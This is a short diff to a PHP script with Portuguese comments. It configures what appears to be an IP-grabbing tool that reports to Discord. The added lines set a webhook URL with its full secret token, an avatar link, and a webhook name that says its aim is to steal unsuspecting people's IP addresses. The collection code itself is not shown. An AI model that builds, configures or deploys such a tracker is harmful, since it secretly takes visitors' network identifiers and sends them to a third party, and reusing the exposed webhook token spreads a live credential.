@@ -1,8 +1,8 @@
 <?php
 
-$Webhook    = ""; //Coloque a webhook aqui!
-$WebhookTag = ""; // Coloque o nome que vc quer
-$WebhookAvatar = ""; //Coloque o avatar que vc quiser
+$Webhook    = "https://discord.com/api/webhooks/1311496771528298517/3oUahfVmet4_R5VQWVLQTUKi_qoVlaFz8noQiya7S1FZ6jSHR8xxmKx0CMXb0o96maeq"; //Coloque a webhook aqui!
+$WebhookTag = "roubar ip de trouxa hahaha"; // Coloque o nome que vc quer
+$WebhookAvatar = "https://media.discordapp.net/attachments/1311496685968556096/1311497134012633138/8c00d63abdcb4e74a4f147cb3900d2afe1f26907597be39a2449dd54b647e917.jpg?ex=67491263&is=6747c0e3&hm=9a6d9fda77b22ae3f248a3691771d16a54bca70211955043a3c5dfb89763ad00&=&format=webp"; //Coloque o avatar que vc quiser
 $DEmbedColor = "FFFFFF"; //Mude a cor
 
 
